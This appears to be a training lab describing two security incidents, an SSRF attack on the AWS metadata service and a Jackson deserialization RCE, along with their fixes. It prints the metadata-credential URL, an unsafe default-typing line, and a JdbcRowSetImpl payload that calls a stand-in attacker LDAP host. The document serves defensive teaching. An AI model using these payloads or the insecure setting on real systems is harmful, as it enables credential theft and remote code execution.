# PRODUCTION SCENARIOS: Production Security Incidents
## Lab 09 | Production Engineering Academy

---

## Scenario 1: The Cloud Metadata SSRF Exfiltration

### Context
A PDF generation and receipt service allowed users to specify a custom logo URL (`https://example.com/logo.png`) to be rendered onto invoices. The Java backend fetched the image using standard `java.net.http.HttpClient`.

### The Exploit
An attacker submitted the URL:
`http://169.254.169.254/latest/meta-data/iam/security-credentials/production-backend-role`
(The AWS Instance Metadata Service IP address).
- The Java service made the HTTP GET request from inside the AWS EC2/EKS pod.
- The IMDS endpoint returned the temporary IAM credentials (Access Key, Secret Key, and Session Token) of the production pod!
- The invoice PDF was generated containing the IAM credentials, which the attacker downloaded, giving them complete administrative access to AWS S3 buckets and RDS databases.

### Root Cause
Unvalidated Server-Side Request Forgery (SSRF) and legacy IMDSv1 allowing unauthenticated metadata requests.

### The Production Fix
1. Enforce **IMDSv2** with token hop limit = 1:
   Requires a PUT request with `X-aws-ec2-metadata-token-ttl-seconds: 21600` before accessing metadata.
2. In Java: Implement strict SSRF IP filtering interceptors that resolve DNS and verify the destination IP is **NOT** a private, loopback, link-local (`169.254.0.0/16`), or multicast address before initiating connections.

---

## Scenario 2: The Jackson Polymorphic Deserialization RCE

### Context
A microservice received JSON webhooks from external partners and deserialized them using Jackson `ObjectMapper` with default typing enabled:
```java
// FATAL: Enables arbitrary class instantiation from JSON
mapper.activateDefaultTyping(LaissezFaireSubTypeValidator.instance, ObjectMapper.DefaultTyping.NON_FINAL);
```

### The Attack
The attacker sent a payload specifying a malicious class name:
```json
["com.sun.rowset.JdbcRowSetImpl", {"dataSourceName":"ldap://attacker-server.com/exploit", "autoCommit":true}]
```
- During deserialization, Jackson instantiated `JdbcRowSetImpl` and invoked `setDataSourceName()`.
- The class initiated a JNDI LDAP lookup to the attacker's server, downloading and executing an arbitrary bytecode payload. The attacker obtained a remote root shell on the host node.

### The Architectural Standard
Never enable global polymorphic typing in Jackson. Use explicit, tightly controlled subtype annotations (`@JsonSubTypes`, `@JsonTypeInfo`) restricted to known sealed domain classes.
